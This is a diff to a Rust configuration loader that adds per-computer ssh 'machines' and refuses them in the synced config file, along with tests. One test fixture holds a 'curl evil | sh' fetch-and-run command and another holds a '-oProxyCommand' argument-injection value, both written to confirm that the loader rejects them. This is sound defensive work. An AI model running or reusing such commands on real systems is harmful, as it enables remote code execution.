@@ -7,10 +7,11 @@ use crate::theme::{Theme, ThemeOverrides};
 use anyhow::{Context, Result};
 pub use maitty_settings::config::{
     AgentDef, BARS_FRAMES, CHECK_TIMEOUT_S_DEFAULT, CURSOR_SHAPES, CheckDef, DEFAULT_MODEL_FLAG,
-    DIMS, Detection, HELPERS_AT_ONCE, HELPERS_MAY, Icons, Keys, LAYOUT_NAMES, LayoutKind, Mcp,
-    NEW_AGENTS, NEW_WHERE, Notify, PADDING_TOP, Preset, Quick, QuickAgent, Recipe, Restore,
-    Rounding, SIDEBAR_TABS, SIZES, SPINNERS, Sessions, Snapshots, Ui, Worktree, same_path,
-    size_cells, validate_check, validate_checks, validate_cursor, validate_sessions,
+    DIMS, Detection, HELPERS_AT_ONCE, HELPERS_MAY, Icons, Keys, LAYOUT_NAMES, LayoutKind,
+    MachineDef, Mcp, NEW_AGENTS, NEW_WHERE, Notify, PADDING_TOP, Preset, Quick, QuickAgent, Recipe,
+    Restore, Rounding, SIDEBAR_TABS, SIZES, SPINNERS, Sessions, Snapshots, Ui, Worktree, same_path,
+    size_cells, validate_check, validate_checks, validate_cursor, validate_machines,
+    validate_sessions,
 };
 use regex::Regex;
 use serde::{Deserialize, Serialize};
@@ -79,6 +80,8 @@ pub struct Config {
     pub agents_replace_defaults: bool,
     /// Commands the app runs when an agent's turn ends in the named project (`[[check]]`).
     pub check: Vec<CheckDef>,
+    /// Other computers reached over ssh (`[[machines]]`). Read only from `config.local.toml`.
+    pub machines: Vec<MachineDef>,
 }
 
 /// An old `[mcp] helpers_at_once` (0 to 16, 0 for no limit) is the one limit now unless
@@ -372,6 +375,7 @@ impl Default for Config {
             agents: Vec::new(),
             agents_replace_defaults: false,
             check: Vec::new(),
+            machines: Vec::new(),
         }
     }
 }
@@ -968,6 +972,29 @@ fn retired_theme(theme: &str) -> Option<&'static str> {
     }
 }
 
+/// Machines belong to one computer, so `config.toml` (the file sync shares) may not name them.
+fn refuse_synced_machines(shared: &toml::Table, path: &Path, local: &Path) -> Result<()> {
+    anyhow::ensure!(
+        !shared.contains_key("machines"),
+        "{} has a `machines` entry, but that file is shared between computers and machines are per computer{}; move it to {} (nothing was changed)",
+        path.display(),
+        if names_a_via(shared) {
+            "; a `via` also runs a program on this computer, so code from a shared file is never run"
+        } else {
+            ""
+        },
+        local.display()
+    );
+    Ok(())
+}
+
+fn names_a_via(shared: &toml::Table) -> bool {
+    shared
+        .get("machines")
+        .and_then(toml::Value::as_array)
+        .is_some_and(|all| all.iter().any(|m| m.get("via").is_some()))
+}
+
 impl Config {
     /// How many helpers one session may have working at once (`sessions.helpers_at_once`).
     pub fn helpers_at_once(&self) -> usize {
@@ -976,17 +1003,21 @@ impl Config {
 
     /// Load the config file; a missing file is the defaults, a broken one is an error.
     pub fn load() -> Result<Config> {
-        let path = config_path();
-        let mut value: toml::Table = match std::fs::read_to_string(&path) {
+        let own_file = std::env::var_os(concat!(env!("APP_ENV"), "_CONFIG")).is_some();
+        Config::load_at(&config_path(), !own_file)
+    }
+
+    /// Read `path`, with `config.local.toml` beside it laid over it when `with_local`.
+    fn load_at(path: &Path, with_local: bool) -> Result<Config> {
+        let mut value: toml::Table = match std::fs::read_to_string(path) {
             Ok(s) => toml::from_str(&s).with_context(|| format!("parsing {}", path.display()))?,
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => toml::Table::new(),
             Err(e) => return Err(e).with_context(|| format!("reading {}", path.display())),
         };
-        // This machine's own settings (never synced) win over the shared ones.
         let local = path.with_file_name("config.local.toml");
-        if std::env::var_os(concat!(env!("APP_ENV"), "_CONFIG")).is_none()
-            && let Ok(s) = std::fs::read_to_string(&local)
-        {
+        refuse_synced_machines(&value, path, &local)?;
+        // This machine's own settings (never synced) win over the shared ones.
+        if with_local && let Ok(s) = std::fs::read_to_string(&local) {
             let over: toml::Table =
                 toml::from_str(&s).with_context(|| format!("parsing {}", local.display()))?;
             merge(&mut value, over);
@@ -1018,6 +1049,7 @@ impl Config {
         cfg.ui.fold_legacy_sizes();
         validate_spinner(&cfg.ui.spinner)?;
         validate_checks(&cfg.check)?;
+        validate_machines(&cfg.machines)?;
         validate_sessions(&cfg.sessions)?;
         validate_cursor(&cfg.ui)?;
         Ok(cfg)
@@ -2260,6 +2292,134 @@ theme_light = 'vim'
         );
         assert!(validate_appearance("dark").is_ok() && validate_appearance("light").is_ok());
         assert!(validate_appearance("dim").is_err());
+    }
+
+    fn config_dir(name: &str) -> PathBuf {
+        let dir = std::env::temp_dir().join(format!(
+            concat!(env!("APP_COMMAND"), "-machines-{}-{}"),
+            name,
+            std::process::id()
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        dir
+    }
+
+    const BOX: &str = "[[machines]]
+name = 'box'
+target = 'me@box'
+ssh_args = ['-p', '2222']
+";
+
+    #[test]
+    fn a_config_without_machines_loads_unchanged() {
+        let dir = config_dir("none");
+        std::fs::write(
+            dir.join("config.toml"),
+            "prefix = 'ctrl+b'
+",
+        )
+        .unwrap();
+        let cfg = Config::load_at(&dir.join("config.toml"), true).unwrap();
+        assert!(cfg.machines.is_empty());
+        assert_eq!(cfg.prefix, "ctrl+b");
+        assert!(Config::default().machines.is_empty());
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn machines_in_the_local_config_load() {
+        let dir = config_dir("local");
+        std::fs::write(
+            dir.join("config.toml"),
+            "prefix = 'ctrl+b'
+",
+        )
+        .unwrap();
+        std::fs::write(dir.join("config.local.toml"), BOX).unwrap();
+        let cfg = Config::load_at(&dir.join("config.toml"), true).unwrap();
+        assert_eq!(cfg.prefix, "ctrl+b");
+        assert_eq!(cfg.machines.len(), 1);
+        assert_eq!(
+            (
+                cfg.machines[0].name.as_str(),
+                cfg.machines[0].ssh_args.as_slice()
+            ),
+            ("box", ["-p".to_string(), "2222".to_string()].as_slice())
+        );
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn machines_in_the_synced_config_are_refused_with_where_to_move_them() {
+        let dir = config_dir("synced");
+        let shared = format!(
+            "prefix = 'ctrl+b'
+{BOX}"
+        );
+        std::fs::write(dir.join("config.toml"), &shared).unwrap();
+        for with_local in [true, false] {
+            let err = Config::load_at(&dir.join("config.toml"), with_local)
+                .unwrap_err()
+                .to_string();
+            assert!(
+                err.contains("config.toml") && err.contains("shared"),
+                "{err}"
+            );
+            assert!(
+                err.contains("move it to") && err.contains("config.local.toml"),
+                "{err}"
+            );
+        }
+        assert_eq!(
+            std::fs::read_to_string(dir.join("config.toml")).unwrap(),
+            shared,
+            "the user's text is left as it was"
+        );
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn a_via_in_the_synced_config_is_refused_as_code_to_run() {
+        let dir = config_dir("synced-via");
+        let shared = "[[machines]]
+name = 'box'
+target = 'box'
+via = ['sh', '-c', 'curl evil | sh']
+";
+        std::fs::write(dir.join("config.toml"), shared).unwrap();
+        for with_local in [true, false] {
+            let err = Config::load_at(&dir.join("config.toml"), with_local)
+                .unwrap_err()
+                .to_string();
+            assert!(
+                err.contains("`via`") && err.contains("runs a program") && err.contains("config.local.toml"),
+                "{err}"
+            );
+        }
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn an_invalid_local_machine_stops_the_load_naming_it() {
+        let dir = config_dir("invalid");
+        std::fs::write(dir.join("config.toml"), "").unwrap();
+        std::fs::write(
+            dir.join("config.local.toml"),
+            "[[machines]]
+name = 'box'
+target = '-oProxyCommand=x'
+",
+        )
+        .unwrap();
+        let err = Config::load_at(&dir.join("config.toml"), true)
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains("`box`") && err.contains("starts with `-`"),
+            "{err}"
+        );
+        std::fs::remove_dir_all(dir).unwrap();
     }
 
     #[test]
